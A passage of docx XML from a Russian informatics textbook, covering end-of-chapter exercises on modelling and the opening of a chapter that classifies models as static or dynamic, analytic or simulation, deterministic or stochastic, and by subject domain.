        <w:t>**Задача:** Спрогнозируйте численность населения города через 5 лет, если текущая численность 50 000 человек, а коэффициент роста 1.5% в год. Используйте модель `P(t) = P₀ × e^(r×t)`.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   _Ответ:_ `P(5) = 50000 × e^(0.015×5) = 50000 × e^0.075 ≈ 50000 × 1.0779 ≈ 53 895 человек`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Задача:** Нарисуйте блок-схему процесса "Вход в систему" (пользователь вводит логин и пароль, система проверяет, если верно — вход успешен, если неверно — сообщение об ошибке).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Задача:** Создайте табличную модель для учёта студентов в университете. Какие столбцы (атрибуты) нужны?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">   _Подсказка: ID, ФИО, группа, курс, email, дата рождения._</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListNumber"/>
      </w:pPr>
      <w:r>
        <w:t>**Задача:** Приведите пример процесса из реальной жизни и выберите подходящий тип диаграммы для его моделирования (блок-схема, UML Activity, BPMN).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">    _Пример:_ "Процесс получения загранпаспорта" → BPMN (много шагов, условия, возможны параллельные ветки).</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Заключение</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Моделирование — это </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>фундамент</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> любого проекта. Без модели работаешь вслепую, а с моделью видишь всю картину. Нарисовал блок-схему — понял алгоритм. Построил Use Case диаграмму — понял, что нужно пользователю. Создал табличную модель — знаешь структуру данных.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Главное — не делать модели ради моделей. Модель должна быть </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>адекватной</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (соответствовать реальности) и </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>полезной</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (помогать решить задачу). Если модель слишком сложная — упрости. Если слишком простая — добавь детали.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">В следующей главе (4.3) поговорим о </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>классификации видов моделирования</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> и </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>математических моделях</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> подробнее.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Следующая глава:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 4.3 Классификация видов моделирования. Математические модели  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Предыдущая глава:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> 4.1 Жизненный цикл баз данных</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Глава 4.3: Классификация видов моделирования. Математические модели</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>Введение</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>В прошлой главе (4.2) мы разобрались, что такое модели и зачем они нужны. Мы поняли, что модель — это упрощённое представление реальности, и посмотрели на основные типы информационных моделей: вербальные, графические, табличные, математические, структурные.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Но это была, скажем так, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>классификация для чайников</w:t>
      </w:r>
      <w:r>
        <w:t>. Реальный мир моделирования гораздо богаче. Модели можно классифицировать по куче разных признаков: статические или динамические, детерминированные или вероятностные, аналитические или имитационные. И каждый тип модели решает свои задачи.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Эта глава связана с:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 4.2** (Информационные модели) — базовые понятия моделирования</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 4.4** (Модели решения задач) — применение моделей на практике</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 5.1** (Алгоритмы) — модели процессов и алгоритмы</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Глава 1.5** (Меры информации) — там была энтропия Шеннона, а это тоже математическая модель</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Короче, если в прошлой главе мы научились рисовать блок-схемы и Use Case диаграммы, то сейчас будем </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>копать глубже</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — разберёмся с классификацией моделирования и погрузимся в математические модели.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Зачем это нужно?</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Потому что на экзамене могут спросить: "Чем отличается детерминированная модель от стохастической?" или "Что такое имитационное моделирование?". А ещё потому, что математические модели — это основа всей современной науки и техники. От прогноза погоды до рекомендаций Netflix — всё это математические модели.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
      </w:pPr>
      <w:r>
        <w:t>4.3.1. Классификация видов моделирования</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>Моделирование можно классифицировать по разным критериям. Давай разберём основные.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>По фактору времени</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>1. Статические модели</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Статическая модель</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> описывает состояние системы в </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>фиксированный момент времени</w:t>
      </w:r>
      <w:r>
        <w:t>. Время не влияет на модель.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Фотография** — модель объекта в один момент времени</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Схема организационной структуры компании** — кто кому подчиняется (на текущий момент)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Таблица "Товары на складе"** — снимок состояния склада</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Карта города** — расположение улиц и зданий (если город не Дубай, где каждый год перестраивают полгорода)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Когда использовать:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Когда нужно описать </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>текущее состояние</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> системы, а не её изменение во времени.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>2. Динамические модели</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Динамическая модель</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> описывает </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>изменение системы во времени</w:t>
      </w:r>
      <w:r>
        <w:t>. Учитывает, как система эволюционирует.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Модель роста населения** `P(t) = P₀ × e^(r×t)` — численность населения меняется со временем</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Модель движения тела** `s(t) = v₀×t + (a×t²)/2` — координата зависит от времени</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Модель распространения эпидемии** (SIR-модель) — количество заболевших растёт со временем</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Графики акций на бирже** — цена меняется каждую секунду</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Когда использовать:</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Когда важно понять, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>как система меняется</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> во времени, прогнозировать будущее состояние.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Аналогия:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Статическая модель** = фотография (один кадр)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Динамическая модель** = видео (последовательность кадров)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>По способу реализации</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>1. Аналитические модели</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Аналитическая модель</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это модель, представленная в виде </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>формулы</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> или </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>уравнения</w:t>
      </w:r>
      <w:r>
        <w:t>, которое можно решить математически и получить точный ответ.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Формула свободного падения:** `h(t) = h₀ - (g×t²)/2`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Закон Ома:** `U = I × R`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Формула площади круга:** `S = π × r²`</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Точное решение</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Быстрое вычисление</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Можно аналитически исследовать поведение системы</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Для сложных систем аналитическое решение может **не существовать** (попробуй найти точную формулу для прогноза погоды, лол)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Требует упрощений, чтобы вывести формулу</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>2. Имитационные модели (симуляции)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Имитационная модель</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это модель, которая </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>симулирует</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> поведение системы шаг за шагом во времени. Вместо формулы — алгоритм, который запускается на компьютере.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Симулятор полёта** — физика самолёта считается в каждый момент времени</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Модель очередей в банке** — генерируются случайные клиенты, симулируется их обслуживание</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Модель движения толпы** — каждый человек = агент, все двигаются по своим правилам, взаимодействуют друг с другом</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Симуляция распространения вируса** — каждый день пересчитывается количество заболевших, выздоровевших, умерших</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Можно моделировать **сверхсложные системы**, где аналитическое решение невозможно</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Легко изменять параметры и смотреть, что получится (what-if анализ)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Медленное (особенно для больших систем)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Результат зависит от случайности (нужно запускать много раз и усреднять)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Аналогия:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Аналитическая модель** = рецепт (чёткая инструкция, результат предсказуем)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Имитационная модель** = кулинарный эксперимент (добавляешь ингредиенты по ходу, смотришь что получится)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>По степени определённости</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>1. Детерминированные модели</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Детерминированная модель</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это модель, в которой </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>нет случайности</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. При одних и тех же входных данных всегда получается </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>один и тот же результат</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Формула площади круга:** `S = π × r²` — при `r = 5` всегда получается `S = 78.54`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Блок-схема алгоритма сортировки** — при одном массиве всегда одна и та же последовательность действий</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Модель движения тела в вакууме** — траектория полностью определена начальными условиями</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Результат предсказуем</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Легко отлаживать (если что-то не так, ошибка в формуле, а не в случайности)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Реальный мир часто **не детерминирован** (случайные события, шумы, ошибки измерений)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>2. Стохастические модели (вероятностные)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Стохастическая модель</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> — это модель, которая учитывает </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>случайность</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> и оперирует </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>вероятностями</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. При одних и тех же входных данных результат может быть </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>разным</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Модель броска монеты** — результат: орёл с вероятностью 50%, решка с вероятностью 50%</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Модель очередей** — клиенты приходят случайно (время прихода — случайная величина)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Модель Монте-Карло** — метод, основанный на случайных числах (прогоняешь симуляцию 10 000 раз, получаешь распределение результатов)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Модель биржевых цен** — цена акции на следующий день зависит от миллиона случайных факторов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Плюсы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Реалистичнее (реальный мир полон случайностей)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Можно оценить **риски** и **вероятность** разных исходов</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Минусы:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Нужно запускать много раз, чтобы получить статистически значимый результат</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Сложнее интерпретировать (вместо одного ответа — распределение ответов)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Аналогия:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Детерминированная модель** = калькулятор (ввёл числа, нажал "=", получил точный ответ)</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>**Стохастическая модель** = рулетка (крутишь колесо, каждый раз новый результат)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t>---</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>По области знаний</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Модели можно классифицировать по той </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>предметной области</w:t>
      </w:r>
      <w:r>
        <w:t>, которую они описывают.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>1. Физические модели</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Описывают физические процессы: механика, термодинамика, электродинамика.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Законы Ньютона: `F = m × a`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Закон всемирного тяготения: `F = G × (m₁×m₂)/r²`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Уравнение теплопроводности (описывает распространение тепла)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>2. Химические модели</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Описывают химические реакции, концентрации веществ.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Уравнение химической реакции: `2H₂ + O₂ → 2H₂O`</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
        <w:t>Модель кинетики реакции (скорость реакции зависит от температуры и концентрации)</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>3. Экономические модели</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Описывают экономические процессы: спрос, предложение, инфляцию.</w:t>
      </w:r>
    </w:p>
    <w:p/>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Примеры:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="ListBullet"/>
      </w:pPr>
      <w:r>
